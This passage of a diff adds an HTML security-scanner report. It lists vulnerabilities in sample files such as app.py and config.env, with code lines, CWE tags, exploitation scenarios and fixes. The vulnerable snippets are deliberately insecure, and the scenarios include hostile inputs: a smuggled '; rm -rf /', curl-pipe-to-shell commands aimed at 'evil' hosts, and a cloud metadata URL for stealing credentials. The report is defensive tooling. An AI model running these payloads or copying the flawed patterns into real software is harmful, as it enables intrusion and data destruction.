+# yaml: yaml.safe_load(data)          # never yaml.load without SafeLoader</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Database connection string with embedded credentials</strong>
+          <span class="mono loc">line 3:9</span>
+          <span class="chip mono">DB_CONN_CREDENTIALS</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> user:password@host URIs embed credentials where logs, crash traces, and APM tools routinely capture them.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> One verbose error log pasted to a public issue = full database access.</p>
+        <pre class="code"><code>$dsn = &quot;mysql://root:S3cr3tP@ss@localhost/shop&quot;;     // credentials in connection string</code></pre>
+        <pre class="fix"><code># AFTER
+DATABASE_URL=postgres://user@host/db   # password via vault/secret store
+# or: pgpass file / IAM auth tokens</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Weak hash algorithm (MD5 / SHA1)</strong>
+          <span class="mono loc">line 13:10</span>
+          <span class="chip mono">WEAK_HASH</span>
+          <span class="chip mono">CWE-327</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> MD5/SHA1 are collision-broken and far too fast for password storage — GPU rigs guess billions/second.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Stolen MD5 password dumps are cracked at scale in hours; identical hashes also leak logins across sites.</p>
+        <pre class="code"><code>$token = md5($_GET['user'] . time());                // weak hash for token</code></pre>
+        <pre class="fix"><code>// AFTER — passwords:
+const bcrypt = require('bcrypt');
+await bcrypt.hash(pw, 12);
+// integrity: crypto.createHash('sha256')</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html</a></p>
+      </div>
+    </section>
+
+    <section class="file">
+      <h3>app.py <span class="meta">(py, 12 findings, risk 99)</span></h3>
+      
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 8:1</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>API_KEY = &quot;sk_live_9f8e7d6c5b4a3210abcd&quot;            # hardcoded secret</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>SQL query built with Python f-string or .format()</strong>
+          <span class="mono loc">line 13:9</span>
+          <span class="chip mono">SQLI_FSTRING</span>
+          <span class="chip mono">CWE-89</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> f-strings interpolate at string-build time; the DB driver never sees a parameter boundary, so user data becomes SQL grammar.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> `email = &quot;a@x.com&quot; OR 1=1 --` returns every row; stacked queries can chain UPDATE/DELETE depending on driver config.</p>
+        <pre class="code"><code>cur.execute(f&quot;SELECT * FROM products WHERE name = '{name}'&quot;)  # SQL injection</code></pre>
+        <pre class="fix"><code># AFTER
+cursor.execute(&quot;SELECT * FROM users WHERE email = %s&quot;, (email,))
+# or with SQLAlchemy:
+select(User).where(User.email == email)</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Command injection risk (shell=True / os.system with interpolation)</strong>
+          <span class="mono loc">line 19:5</span>
+          <span class="chip mono">CMDI_SHELL_TRUE</span>
+          <span class="chip mono">CWE-78</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> shell=True / os.system routes the command through /bin/sh; every metacharacter in user input is interpreted.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A filename of `; rm -rf /` or `$(curl evil.sh)` becomes a second command the server happily executes.</p>
+        <pre class="code"><code>os.system(&quot;ping -c 1 &quot; + host)                  # command injection</code></pre>
+        <pre class="fix"><code># AFTER
+subprocess.run([&quot;convert&quot;, user_path, out_path], check=True, shell=False)</code></pre>
+        <p class="refs">References: <a href="https://docs.python.org/3/library/subprocess.html#security-considerations">https://docs.python.org/3/library/subprocess.html#security-considerations</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Command injection risk (shell=True / os.system with interpolation)</strong>
+          <span class="mono loc">line 20:5</span>
+          <span class="chip mono">CMDI_SHELL_TRUE</span>
+          <span class="chip mono">CWE-78</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> shell=True / os.system routes the command through /bin/sh; every metacharacter in user input is interpreted.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A filename of `; rm -rf /` or `$(curl evil.sh)` becomes a second command the server happily executes.</p>
+        <pre class="code"><code>subprocess.run(&quot;nslookup %s&quot; % host, shell=True)</code></pre>
+        <pre class="fix"><code># AFTER
+subprocess.run([&quot;convert&quot;, user_path, out_path], check=True, shell=False)</code></pre>
+        <p class="refs">References: <a href="https://docs.python.org/3/library/subprocess.html#security-considerations">https://docs.python.org/3/library/subprocess.html#security-considerations</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Unsafe deserialization (pickle / yaml.load / unserialize)</strong>
+          <span class="mono loc">line 26:11</span>
+          <span class="chip mono">DESERIALIZE_UNSAFE</span>
+          <span class="chip mono">CWE-502</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Pickle/yaml.load/unserialize instantiate arbitrary objects from the byte stream. Attackers craft &quot;gadget chains&quot; that end in code execution.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A POSTed session cookie containing a crafted pickle runs commands on unpickle — no other vulnerability needed.</p>
+        <pre class="code"><code>obj = pickle.loads(data)                        # unsafe deserialization</code></pre>
+        <pre class="fix"><code># AFTER
+json.loads(data)                      # structured data only
+# yaml: yaml.safe_load(data)          # never yaml.load without SafeLoader</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Unsafe deserialization (pickle / yaml.load / unserialize)</strong>
+          <span class="mono loc">line 27:11</span>
+          <span class="chip mono">DESERIALIZE_UNSAFE</span>
+          <span class="chip mono">CWE-502</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Pickle/yaml.load/unserialize instantiate arbitrary objects from the byte stream. Attackers craft &quot;gadget chains&quot; that end in code execution.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A POSTed session cookie containing a crafted pickle runs commands on unpickle — no other vulnerability needed.</p>
+        <pre class="code"><code>cfg = yaml.load(open(&quot;cfg.yml&quot;))                # yaml.load without SafeLoader</code></pre>
+        <pre class="fix"><code># AFTER
+json.loads(data)                      # structured data only
+# yaml: yaml.safe_load(data)          # never yaml.load without SafeLoader</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Use of eval() on potentially untrusted data</strong>
+          <span class="mono loc">line 32:16</span>
+          <span class="chip mono">EVAL_USE</span>
+          <span class="chip mono">CWE-95</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> eval/exec compiles and runs data as code inside your process. Any path from user input to eval equals full server-side RCE.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A &quot;calculator&quot; input like `require(&quot;child_process&quot;).execSync(&quot;curl evil|sh&quot;)` runs instantly, in-process, with your privileges.</p>
+        <pre class="code"><code>return str(eval(request.args.get(&quot;expr&quot;)))      # code execution</code></pre>
+        <pre class="fix"><code>// AFTER — parse instead of evaluate
+const value = JSON.parse(input); // data, not code
+// domain logic instead of dynamic code</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/Code_Injection">https://owasp.org/www-community/attacks/Code_Injection</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Server-side request built from user-controlled URL</strong>
+          <span class="mono loc">line 36:12</span>
+          <span class="chip mono">SSRF_URL_INPUT</span>
+          <span class="chip mono">CWE-918</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> The server fetches an attacker-chosen URL, so the request originates from inside your network — firewalls see it as trusted.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Target http://169.254.169.254/latest/meta-data/ to steal cloud credentials, or internal admin panels.</p>
+        <pre class="code"><code>return requests.get(request.args[&quot;url&quot;], verify=False).text  # SSRF + TLS off</code></pre>
+        <pre class="fix"><code>// AFTER — allowlist + resolve check
+const u = new URL(input);
+if (!ALLOWED_HOSTS.has(u.hostname)) throw new Error('blocked');
+// resolve DNS first, reject private ranges (169.254.0.0/16, 10/8, 127/8)</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">https://owasp.org/www-community/attacks/Server_Side_Request_Forgery</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>TLS certificate verification disabled</strong>
+          <span class="mono loc">line 36:46</span>
+          <span class="chip mono">TLS_VERIFY_OFF</span>
+          <span class="chip mono">CWE-295</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> With verification disabled, any MITM (rogue Wi-Fi, BGP hijack, hostile proxy) presents any certificate and it is accepted.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Credentials and tokens are read in transit; payloads replaced silently.</p>
+        <pre class="code"><code>return requests.get(request.args[&quot;url&quot;], verify=False).text  # SSRF + TLS off</code></pre>
+        <pre class="fix"><code># AFTER
+# python: verify=True (default) + corporate CA via certifi
+# node: do NOT set rejectUnauthorized:false — add CA bundle instead</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Weak hash algorithm (MD5 / SHA1)</strong>
+          <span class="mono loc">line 44:20</span>
+          <span class="chip mono">WEAK_HASH</span>
+          <span class="chip mono">CWE-327</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> MD5/SHA1 are collision-broken and far too fast for password storage — GPU rigs guess billions/second.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Stolen MD5 password dumps are cracked at scale in hours; identical hashes also leak logins across sites.</p>
+        <pre class="code"><code>return hashlib.md5(request.args[&quot;pw&quot;].encode()).hexdigest()  # weak hash</code></pre>
+        <pre class="fix"><code>// AFTER — passwords:
+const bcrypt = require('bcrypt');
+await bcrypt.hash(pw, 12);
+// integrity: crypto.createHash('sha256')</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #f9c74f">
+        <div class="fhead">
+          <span class="badge" style="background:#f9c74f22;color:#f9c74f;border:1px solid #f9c74f55">MEDIUM</span>
+          <strong>Debug mode enabled in production config</strong>
+          <span class="mono loc">line 7:1</span>
+          <span class="chip mono">DEBUG_MODE_ON</span>
+          <span class="chip mono">CWE-489</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Debug mode exposes stack traces, settings, and interactive consoles (Werkzeug /debug, Django /admin traceback).</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Werkzeug debugger PIN bypass → arbitrary code execution from a browser.</p>
+        <pre class="code"><code>DEBUG = True                                        # debug mode on</code></pre>
+        <pre class="fix"><code># AFTER
+DEBUG = os.getenv('DEBUG', 'false').lower() == 'true'
+# and configure generic error pages for production</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration">https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #f9c74f">
+        <div class="fhead">
+          <span class="badge" style="background:#f9c74f22;color:#f9c74f;border:1px solid #f9c74f55">MEDIUM</span>
+          <strong>Debug mode enabled in production config</strong>
+          <span class="mono loc">line 51:5</span>
+          <span class="chip mono">DEBUG_MODE_ON</span>
+          <span class="chip mono">CWE-489</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Debug mode exposes stack traces, settings, and interactive consoles (Werkzeug /debug, Django /admin traceback).</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Werkzeug debugger PIN bypass → arbitrary code execution from a browser.</p>
+        <pre class="code"><code>app.run(debug=True)</code></pre>
+        <pre class="fix"><code># AFTER
+DEBUG = os.getenv('DEBUG', 'false').lower() == 'true'
+# and configure generic error pages for production</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration">https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration</a></p>
+      </div>
+    </section>
+
+    <section class="file">
+      <h3>config.env <span class="meta">(env, 13 findings, risk 100)</span></h3>
+      
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 2:1</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>SECRET_KEY = &quot;django-insecure-12345abcdef&quot;</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 3:10</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>DATABASE_PASSWORD = &quot;P0stgr3s_Sup3rS3cret&quot;</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 4:1</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>API_KEY = &quot;sk_live_51KxYzAbCdEfGh123456&quot;</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 5:5</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>AWS_SECRET_ACCESS_KEY = &quot;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&quot;</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 6:8</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>STRIPE_TOKEN = &quot;tok_live_4yFvZqXwRt7890&quot;</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 7:8</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>GITHUB_TOKEN = &quot;ghp_0123456789abcdefghijklmnopqrstuvwxyz&quot;</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Secrets defined in tracked env-style file</strong>
+          <span class="mono loc">line 2:1</span>
+          <span class="chip mono">ENV_FILE_COMMITTED</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Tracked .env files put production secrets in history; deleting the file does not remove it from git log.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Clone the repo, `git log -p .env` — every past secret is recoverable.</p>
+        <pre class="code"><code>SECRET_KEY = &quot;django-insecure-12345abcdef&quot;</code></pre>
+        <pre class="fix"><code># AFTER
+echo &quot;.env&quot; &gt;&gt; .gitignore
+git rm --cached .env   # then rotate ALL values in it</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration">https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Secrets defined in tracked env-style file</strong>
+          <span class="mono loc">line 3:1</span>
+          <span class="chip mono">ENV_FILE_COMMITTED</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Tracked .env files put production secrets in history; deleting the file does not remove it from git log.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Clone the repo, `git log -p .env` — every past secret is recoverable.</p>
+        <pre class="code"><code>DATABASE_PASSWORD = &quot;P0stgr3s_Sup3rS3cret&quot;</code></pre>
+        <pre class="fix"><code># AFTER
+echo &quot;.env&quot; &gt;&gt; .gitignore
+git rm --cached .env   # then rotate ALL values in it</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration">https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Secrets defined in tracked env-style file</strong>
+          <span class="mono loc">line 4:1</span>
+          <span class="chip mono">ENV_FILE_COMMITTED</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Tracked .env files put production secrets in history; deleting the file does not remove it from git log.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Clone the repo, `git log -p .env` — every past secret is recoverable.</p>
+        <pre class="code"><code>API_KEY = &quot;sk_live_51KxYzAbCdEfGh123456&quot;</code></pre>
+        <pre class="fix"><code># AFTER
+echo &quot;.env&quot; &gt;&gt; .gitignore
+git rm --cached .env   # then rotate ALL values in it</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration">https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Secrets defined in tracked env-style file</strong>
+          <span class="mono loc">line 5:1</span>
+          <span class="chip mono">ENV_FILE_COMMITTED</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Tracked .env files put production secrets in history; deleting the file does not remove it from git log.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Clone the repo, `git log -p .env` — every past secret is recoverable.</p>
+        <pre class="code"><code>AWS_SECRET_ACCESS_KEY = &quot;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&quot;</code></pre>
+        <pre class="fix"><code># AFTER
+echo &quot;.env&quot; &gt;&gt; .gitignore
+git rm --cached .env   # then rotate ALL values in it</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration">https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Secrets defined in tracked env-style file</strong>
+          <span class="mono loc">line 6:1</span>
+          <span class="chip mono">ENV_FILE_COMMITTED</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Tracked .env files put production secrets in history; deleting the file does not remove it from git log.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Clone the repo, `git log -p .env` — every past secret is recoverable.</p>
+        <pre class="code"><code>STRIPE_TOKEN = &quot;tok_live_4yFvZqXwRt7890&quot;</code></pre>
+        <pre class="fix"><code># AFTER
+echo &quot;.env&quot; &gt;&gt; .gitignore
+git rm --cached .env   # then rotate ALL values in it</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration">https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Credential-bearing git/URL token in code</strong>
+          <span class="mono loc">line 7:17</span>
+          <span class="chip mono">GIT_IN_URL</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> CI tokens (ghp_, xox…, x-access-token) pasted into code or URLs are live credentials scoped to repos/orgs.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Clone-and-escalate: attacker reads private repos, poisons workflows, pivots to cloud roles.</p>
+        <pre class="code"><code>GITHUB_TOKEN = &quot;ghp_0123456789abcdefghijklmnopqrstuvwxyz&quot;</code></pre>
+        <pre class="fix"><code># AFTER
+git clone https://x-access-token:${GH_TOKEN}@github.com/org/repo
+# token from CI secret store; add ghp_ to secret-scanning blocklist</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Secrets defined in tracked env-style file</strong>
+          <span class="mono loc">line 7:1</span>
+          <span class="chip mono">ENV_FILE_COMMITTED</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Tracked .env files put production secrets in history; deleting the file does not remove it from git log.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Clone the repo, `git log -p .env` — every past secret is recoverable.</p>
